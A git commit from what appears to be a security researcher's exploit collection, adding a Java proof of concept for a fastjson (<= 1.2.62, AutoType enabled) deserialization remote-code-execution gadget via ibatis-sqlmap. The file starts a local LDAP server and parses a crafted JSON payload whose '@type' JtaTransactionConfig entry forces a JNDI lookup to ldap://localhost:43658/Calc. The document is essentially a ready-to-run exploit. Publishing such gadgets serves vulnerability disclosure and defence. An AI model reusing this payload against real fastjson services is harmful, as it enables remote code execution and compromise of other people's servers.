c249e706ac786623a219808d2f2adc4238419c5b
threedr3am <929811313@qq.com>
2020-02-29 19:06:04 +0800

    feat:fastjson新gadget（ibatis-sqlmap）

---
+++ fastjson/src/main/java/com/threedr3am/bug/fastjson/IbatisSqlmapPoc.java
@@ -0,0 +1,39 @@
+package com.threedr3am.bug.fastjson;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+import com.threedr3am.bug.common.server.LdapServer;
+
+/**
+ * fastjson <= 1.2.62 RCE，需要开启AutoType
+ *
+ * <dependency>
+ *       <groupId>org.apache.ibatis</groupId>
+ *       <artifactId>ibatis-sqlmap</artifactId>
+ *       <version>2.3.4.726</version>
+ * </dependency>
+ *
+ * <dependency>
+ *       <groupId>javax</groupId>
+ *       <artifactId>javaee-api</artifactId>
+ *       <version>8.0.1</version>
+ * </dependency>
+ *
+ * @author threedr3am
+ */
+public class IbatisSqlmapPoc {
+  static {
+    //rmi server示例
+//    RmiServer.run();
+
+    //ldap server示例
+    LdapServer.run();
+  }
+
+  public static void main(String[] args) {
+    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+
+    String payload = "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://localhost:43658/Calc\"}}";//ldap方式
+    JSON.parse(payload);
+  }
+}
